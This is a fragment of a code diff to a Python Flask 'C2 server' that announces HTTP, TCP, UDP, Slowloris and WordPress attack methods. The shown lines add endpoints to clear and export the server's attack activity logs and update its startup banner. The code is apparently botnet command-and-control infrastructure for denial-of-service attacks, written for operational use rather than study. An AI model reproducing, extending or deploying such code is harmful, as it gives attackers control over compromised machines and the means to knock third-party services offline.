+        print(f"[!] {error_msg}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/logs/clear', methods=['POST', 'OPTIONS'])
+def clear_logs():
+    """Clear all activity logs"""
+    if request.method == 'OPTIONS':
+        return '', 200
+    
+    try:
+        with log_lock:
+            attack_logs.clear()
+        log_activity('Activity logs cleared', 'warning')
+        print(f"[+] Activity logs cleared")
+        return jsonify({'status': 'success', 'message': 'Activity logs cleared'})
+    except Exception as e:
+        error_msg = f'Error in clear_logs: {str(e)}'
+        print(f"[!] {error_msg}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/logs/export', methods=['GET', 'OPTIONS'])
+def export_logs():
+    """Export logs as text file"""
+    if request.method == 'OPTIONS':
+        return '', 200
+    
+    try:
+        with log_lock:
+            log_text = "C2 SERVER LOGS - FIXED + ALL METHODS\n"
+            log_text += "=" * 60 + "\n\n"
+            for log in attack_logs:
+                log_text += f"[{log['time']}] {log['message']}\n"
+        
+        return Response(log_text, mimetype='text/plain')
+    except Exception as e:
+        error_msg = f'Error in export_logs: {str(e)}'
+        print(f"[!] {error_msg}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
 def cleanup():
     """Cleanup on server shutdown"""
     print("\n[!] Server shutting down...")
@@ -697,10 +1432,8 @@ def cleanup():
     print(f"[+] Goodbye!")
 
 if __name__ == '__main__':
-    import sys
-    
     print("\n" + "="*60)
-    print("  FIXED C2 SERVER - ONLINE BOT DETECTION")
+    print("  FIXED C2 SERVER + ALL ATTACK METHODS")
     print("="*60)
     
     port = int(os.environ.get("PORT", 5000))
@@ -708,6 +1441,7 @@ if __name__ == '__main__':
     print(f"[+] Starting server on port {port}")
     print(f"[+] Online threshold: {ONLINE_THRESHOLD} seconds")
     print(f"[+] Update interval: 2 seconds")
+    print(f"[+] Attack Methods: HTTP, TCP, UDP, Slowloris, WordPress")
     print(f"[+] Waiting for connections...\n")
     
     atexit.register(cleanup)
